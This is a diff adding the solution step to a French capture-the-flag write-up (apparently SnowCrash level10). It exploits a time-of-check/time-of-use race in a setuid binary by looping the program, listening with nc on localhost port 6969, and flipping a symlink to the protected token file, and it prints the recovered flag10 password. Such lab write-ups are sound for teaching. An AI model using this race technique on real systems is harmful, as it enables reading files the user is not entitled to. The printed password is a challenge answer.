@@ -52,3 +52,24 @@ write(1, "wrote file!\n", 12wrote file!
 )           = 12
 ```
 Lors du strace de l'executable, on voit qu'il essaye d'`access` sur le fichier avec la permision `READ` avant de l'ouvrir et de se connecter. On pourrait peut être faire une [Race condition](https://en.wikipedia.org/wiki/Race_condition) ?
+
+Donc pour ce faire, il faudrait lancer le program avec comme fichier `toto` dont on a les permissions de `read` puis sur la milisecond plus tard après l'execution d'`access` changer le fichier `toto` par un autre fichier dont on n'as pas la permission de lire comme le `token`. Pour ce faite on peut le faire grace au `softlink`.
+
+Et pour avoir le plus de chance possible on va lancer le program à l'infini.
+
+On lance `tmux` ou tous simplement 3 instance `ssh`.
+- Une qui va executer le program à l'infini
+- Une qui va juste listen sur le port `6969`
+- Et la dernière qui va link sur un fichier puis attendre une milisecond et relink sur `token`.
+
+```sh
+# Instance 1
+while true; do ./level10 tata 127.0.0.1; done
+
+# Instance 2
+nc -kl 6969
+
+# Instance 3
+ln -sf /dev/null tata; sleep 0.1; ln -sf token tata
+```
+Et sur l'instance 2 on recoit donc le contenu de token qui est le mot de passe de flag10. `woupa2yuojeeaaed06riuj63c`
